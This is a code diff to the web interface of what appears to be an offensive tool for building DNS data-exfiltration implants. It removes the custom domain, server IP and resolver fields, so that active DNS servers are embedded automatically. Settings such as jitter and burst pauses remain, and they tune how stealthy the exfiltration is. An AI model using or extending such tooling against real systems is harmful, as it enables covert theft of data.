@@ -559,25 +559,7 @@
                     <div id="exfilDNSServersList" style="background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 4px; min-height: 80px; color: #444;">
                         Loading DNS servers...
                     </div>
-                    <div class="help-text">Leave custom domains empty to automatically use all active DNS servers.</div>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Custom Domains (optional)</label>
-                    <textarea id="exfilDomains" class="form-input" style="min-height: 70px;" placeholder="corp-files.example, cache.example"></textarea>
-                    <div class="help-text">Comma or newline separated list. Overrides the auto-generated domain list above.</div>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Server IP *</label>
-                    <input type="text" id="exfilServerIP" class="form-input" placeholder="10.0.0.10">
-                    <div class="help-text">IP address that DNS servers should forward exfil traffic to. Autofills from active DNS servers when available.</div>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Resolver Overrides (optional)</label>
-                    <textarea id="exfilResolvers" class="form-input" style="min-height: 70px;" placeholder="9.9.9.9:53, 1.1.1.1:53"></textarea>
-                    <div class="help-text">Comma or newline separated resolvers the implant should prefer. Leave empty to use system defaults.</div>
+                    <div class="help-text">All active DNS servers are embedded automatically. Disable or delete a server to remove it from the exfil client.</div>
                 </div>
 
                 <div class="form-group">
@@ -767,17 +749,6 @@
             }
         }
 
-        function parseListInput(value) {
-            if (!value) {
-                return [];
-            }
-
-            return value
-                .split(/[\n,]+/)
-                .map(item => item.trim())
-                .filter(item => item.length > 0);
-        }
-
         function showAlert(message, type = 'success') {
             const container = document.getElementById('alertContainer');
             const alert = document.createElement('div');
@@ -830,21 +801,13 @@
                 const exfilList = document.getElementById('exfilDNSServersList');
                 if (exfilList) {
                     if (servers.length === 0) {
-                        exfilList.innerHTML = '<span style="color: #555;">No DNS servers available. Build one or specify custom domains.</span>';
+                        exfilList.innerHTML = '<span style="color: #555;">No DNS servers available. Build one before generating an exfil client.</span>';
                     } else {
                         exfilList.innerHTML = servers.map(server => {
                             const marker = server.status === 'active' ? '✓' : '•';
                             const addr = server.address ? ` - ${server.address}` : '';
                             return `<div style="padding: 5px; color: ${server.status === 'active' ? '#4CAF50' : '#777'};">${marker} ${server.domain}${addr}</div>`;
                         }).join('');
-                    }
-                }
-
-                const exfilServerInput = document.getElementById('exfilServerIP');
-                if (exfilServerInput && !exfilServerInput.value && servers.length > 0) {
-                    const withAddress = servers.find(server => server.address);
-                    if (withAddress && withAddress.address) {
-                        exfilServerInput.value = withAddress.address;
                     }
                 }
             } catch (error) {
@@ -1023,21 +986,19 @@
         }
 
         async function buildExfilClient() {
+            const activeServers = (window.availableDNSServers || []).filter(s => s.status === 'active');
+            if (activeServers.length === 0) {
+                showAlert('No active DNS servers are available. Build or activate one before generating an exfil client.', 'error');
+                return;
+            }
+
             const platform = document.getElementById('exfilPlatform').value;
             const architecture = document.getElementById('exfilArchitecture').value;
-            const serverIP = document.getElementById('exfilServerIP').value.trim();
-            const domains = parseListInput(document.getElementById('exfilDomains').value);
-            const resolvers = parseListInput(document.getElementById('exfilResolvers').value);
             const chunkBytes = parseInt(document.getElementById('exfilChunkBytes').value, 10) || 0;
             const jitterMin = parseInt(document.getElementById('exfilJitterMin').value, 10) || 0;
             const jitterMax = parseInt(document.getElementById('exfilJitterMax').value, 10) || 0;
             const chunksPerBurst = parseInt(document.getElementById('exfilChunksPerBurst').value, 10) || 0;
             const burstPause = parseInt(document.getElementById('exfilBurstPause').value, 10) || 0;
-
-            if (!serverIP) {
-                showAlert('Server IP is required for exfil clients.', 'error');
-                return;
-            }
 
             showLoading('Building exfil client... This can take a couple of minutes');
 
@@ -1045,9 +1006,6 @@
                 const response = await authFetch('/api/builder/exfil-client', {
                     method: 'POST',
                     body: JSON.stringify({
-                        domains,
-                        resolvers,
-                        server_ip: serverIP,
                         chunk_bytes: chunkBytes,
                         jitter_min_ms: jitterMin,
                         jitter_max_ms: jitterMax,
